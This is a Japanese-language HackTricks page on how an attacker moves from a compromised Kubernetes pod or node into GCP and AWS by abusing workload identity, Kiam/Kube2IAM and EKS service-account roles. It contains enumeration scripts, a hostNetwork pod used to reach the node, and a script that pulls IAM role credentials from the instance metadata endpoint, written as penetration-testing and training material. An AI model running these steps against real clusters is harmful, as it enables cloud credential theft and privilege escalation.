# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCP

GCP内でk8sクラスターを実行している場合、クラスター内で実行されているアプリケーションがGCPにアクセスできるようにしたいと思うでしょう。これを行う一般的な方法は2つあります。

### GCP-SAキーをシークレットとしてマウントする

**KubernetesアプリケーションにGCPへのアクセスを提供する**一般的な方法は次のとおりです。

* GCPサービスアカウントを作成する
* 必要な権限をバインドする
* 作成したSAのjsonキーをダウンロードする
* ポッド内にシークレットとしてマウントする
* jsonのパスを指すGOOGLE\_APPLICATION\_CREDENTIALS環境変数を設定する

{% hint style="warning" %}
したがって、**攻撃者**として、ポッド内のコンテナを侵害した場合は、その**env** **variable**と**json** **files**にGCPの資格情報が含まれているか確認する必要があります。
{% endhint %}

### GSA jsonをKSAシークレットに関連付ける

GKEクラスターにGSAへのアクセスを提供する方法は、次のようにバインドすることです。

* 次のコマンドを使用して、GKEクラスターと同じ名前空間にKubernetesサービスアカウントを作成します:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* GKEクラスターへのアクセスを許可したいGCPサービスアカウントの資格情報を含むKubernetes Secretを作成します。これは、以下の例のように`gcloud`コマンドラインツールを使用して行うことができます:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* 次のコマンドを使用してKubernetes SecretをKubernetesサービスアカウントにバインドします:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
**第二のステップ**では、**GSAの資格情報をKSAのシークレットとして設定**しました。次に、**GKE**クラスターの**内部**からその**シークレットを読み取る**ことができれば、**そのGCPサービスアカウントに昇格**できます。
{% endhint %}

### GKEワークロードアイデンティティ

ワークロードアイデンティティを使用すると、[Kubernetesサービスアカウント](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)を[Googleサービスアカウント](https://cloud.google.com/iam/docs/understanding-service-accounts)として機能するように構成できます。Kubernetesサービスアカウントで実行されているポッドは、Google Cloud APIにアクセスする際に自動的にGoogleサービスアカウントとして認証されます。

この動作を有効にするための**最初の一連のステップ**は、**GCPでワークロードアイデンティティを有効にする**ことです（[**ステップ**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)）およびk8sが模倣するGCP SAを作成することです。

* 新しいクラスターで**ワークロードアイデンティティを有効にする**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **新しいノードプールを作成/更新する**（オートパイロットクラスターでは必要ありません）

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* K8sからGCP権限を持つ**GCPサービスアカウントを偽装する**を作成します：

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **クラスター**に**接続**し、使用する**サービスアカウント**を**作成**します

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSAをKSAにバインドする**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA**を使用して**pod**を実行し、**GSA**への**アクセス**を確認します：
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
以下のコマンドを確認して、必要に応じて認証を行ってください：

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
K8s内部の攻撃者として、**`iam.gke.io/gcp-service-account` アノテーション**を持つ**SAs**を**検索する**べきです。これは、そのSAがGCP内の何かにアクセスできることを示しています。もう一つのオプションは、クラスター内の各KSAを悪用し、それがアクセス権を持っているかどうかを確認することです。\
GCPからは、バインディングを列挙し、**Kubernetes内のSAsにどのようなアクセスを与えているかを知る**ことが常に興味深いです。
{% endhint %}

これは、**そのアノテーション**を探して**すべてのポッド**定義を簡単に**反復する**ためのスクリプトです：
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (PodsのためのIAMロール) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

PodsにIAMロールを付与する（古い）方法は、[**Kiam**](https://github.com/uswitch/kiam)または[**Kube2IAM**](https://github.com/jtblin/kube2iam) **サーバー**を使用することです。基本的に、**特権のあるIAMロール**の**デーモンセット**をクラスター内で実行する必要があります。このデーモンセットが、必要なポッドにIAMロールへのアクセスを提供します。

まず最初に、**どのロールが名前空間内でアクセス可能かを設定する**必要があり、これは名前空間オブジェクト内のアノテーションで行います：

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

一度名前空間がIAMロールで構成されると、Podに持たせることができるロールを**各Pod定義で指定することができます**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
攻撃者として、もしポッドや名前空間にこれらの**アノテーション**を見つけたり、kiam/kube2iamサーバーが（おそらくkube-systemで）実行されている場合、あなたは**ポッドによって既に使用されているすべてのr**oleを**なりすます**ことができ、さらに（AWSアカウントにアクセスできる場合はロールを列挙することができます）。
{% endhint %}

#### IAMロールを持つポッドの作成

{% hint style="info" %}
指定するIAMロールは、kiam/kube2iamロールと同じAWSアカウント内に存在し、そのロールがアクセスできる必要があります。
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role for K8s Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

これは**AWSによる推奨方法**です。

1. まず、[クラスターのためのOIDCプロバイダーを作成する](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html)必要があります。
2. 次に、SAが必要とする権限を持つIAMロールを作成します。
3. [IAMロールとSAの間に信頼関係を作成する](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html)必要があります（または、名前空間がロールへのアクセスをすべてのSAに与える）。_信頼関係は主にOIDCプロバイダー名、名前空間名、SA名を確認します_。
4. 最後に、**ロールのARNを示すアノテーションを持つSAを作成し**、そのSAで実行されるポッドは**ロールのトークンにアクセスできる**ようになります。**トークン**は**ファイルに書き込まれ**、パスは**`AWS_WEB_IDENTITY_TOKEN_FILE`**に指定されます（デフォルト: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`）
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
To **get aws using the token** from `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` run:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
攻撃者として、K8sクラスターを列挙できる場合は、**そのアノテーションを持つサービスアカウント**を確認して**AWSに昇格**します。これを行うには、IAMの**特権サービスアカウント**の1つを使用して**exec/create**で**ポッド**を作成し、トークンを盗みます。

さらに、ポッド内にいる場合は、**AWS\_ROLE\_ARN**や**AWS\_WEB\_IDENTITY\_TOKEN**のような環境変数を確認してください。
{% endhint %}

{% hint style="danger" %}
時々、役割の**信頼ポリシー**が**不適切に構成**されていることがあり、期待されるサービスアカウントにAssumeRoleアクセスを与える代わりに、**すべてのサービスアカウント**に与えてしまうことがあります。したがって、制御されたサービスアカウントにアノテーションを書き込むことができれば、その役割にアクセスできます。

**詳細については以下のページを確認してください**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### クラスター内のIAMロールを持つポッドとサービスアカウントを見つける

これは、**すべてのポッドとサービスアカウント**の定義を**反復処理**して**そのアノテーション**を探すためのスクリプトです:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Role

前のセクションでは、ポッドを使用してIAMロールを盗む方法について説明しましたが、K8sクラスターの**ノードはクラウド内のインスタンス**であることに注意してください。これは、ノードが**新しいIAMロールを持っている可能性が高い**ことを意味します（_通常、K8sクラスターのすべてのノードは同じIAMロールを持っているため、各ノードを確認する価値がないかもしれません_）。

ただし、ノードからメタデータエンドポイントにアクセスするためには重要な要件があります。ノード内にいる必要があります（sshセッション？）または少なくとも同じネットワークにいる必要があります：
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAMロールトークンを盗む

以前、**ポッドにIAMロールをアタッチする**方法や、**ノードにエスケープしてインスタンスにアタッチされたIAMロールを盗む**方法について説明しました。

以下のスクリプトを使用して、新しく努力して得た**IAMロールの資格情報**を**盗む**ことができます：
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## 参考文献

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**

</details>
{% endhint %}
